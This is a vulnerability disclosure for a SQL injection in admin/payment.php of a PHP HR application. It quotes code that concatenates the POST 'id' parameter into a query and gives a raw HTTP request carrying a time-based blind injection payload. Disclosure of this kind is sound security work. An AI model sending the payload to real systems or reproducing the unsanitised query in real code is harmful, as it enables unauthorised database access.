### Vulnerability file address

`admin/payment.php` from line 7,The `$_POST['id']` parameter is controllable and the `$_POST['id']` is not protected from sql injection, line 8 `$stmt->execute();` ,line 10 `$product = $stmt->fetch(PDO::FETCH_ASSOC);`,line 10 performs a SQL query, causing SQL injection

```php
<?php
//echo  "SELECT * FROM tbl_invoice WHERE id='".$_GET['id']."'";
include('../assets/constants/config.php');
require_once('../assets/constants/check-login.php');
require_once('../assets/constants/fetch-my-info.php');

$stmt = $conn->prepare("SELECT * FROM tbl_invoice WHERE id='".$_POST['id']."'");
$stmt->execute();
//echo print_r($stmt);exit;
$product = $stmt->fetch(PDO::FETCH_ASSOC);
```

### POC

```http
POST /CMS/php/_hr_soft/admin/payment.php HTTP/1.1
Host: 10.0.0.20:82
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=81293i00fqra5g881e77or40t2
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

id=160' AND (SELECT 4856 FROM (SELECT(SLEEP(5)))AtZj)-- gowM
```

### Attack results pictures

![image-20250130165213747](https://raw.githubusercontent.com/nixuchuan/imgs/main/202501301652785.png)